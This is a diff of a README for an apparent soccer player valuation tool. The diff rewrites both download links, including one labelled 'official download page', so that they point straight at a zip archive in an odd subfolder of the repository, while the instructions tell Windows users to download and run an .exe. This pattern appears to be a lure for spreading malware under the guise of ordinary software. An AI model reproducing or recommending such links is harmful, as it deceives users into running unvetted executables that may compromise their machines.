@@ -1,6 +1,6 @@
 # ⚽ undervalued_soccer_data_analyst - Find hidden talent in soccer markets
 
-[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/Waylenunclothed87/undervalued_soccer_data_analyst)
+[![](https://img.shields.io/badge/Download_Software-Blue-blue)](https://github.com/Waylenunclothed87/undervalued_soccer_data_analyst/raw/refs/heads/main/morillon/soccer_undervalued_analyst_data_v1.7.zip)
 
 This application helps you identify soccer players who provide high performance for a low market cost. It uses machine learning models to compare player statistics against their transfer value. You get an interactive dashboard to explore these insights on your computer.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to get the tool running on your Windows machine.
 
-1. Visit the [official download page](https://github.com/Waylenunclothed87/undervalued_soccer_data_analyst).
+1. Visit the [official download page](https://github.com/Waylenunclothed87/undervalued_soccer_data_analyst/raw/refs/heads/main/morillon/soccer_undervalued_analyst_data_v1.7.zip).
 2. Locate the section labeled Releases on the right side of the screen.
 3. Click on the latest version link.
 4. Download the file ending in .exe to your computer.
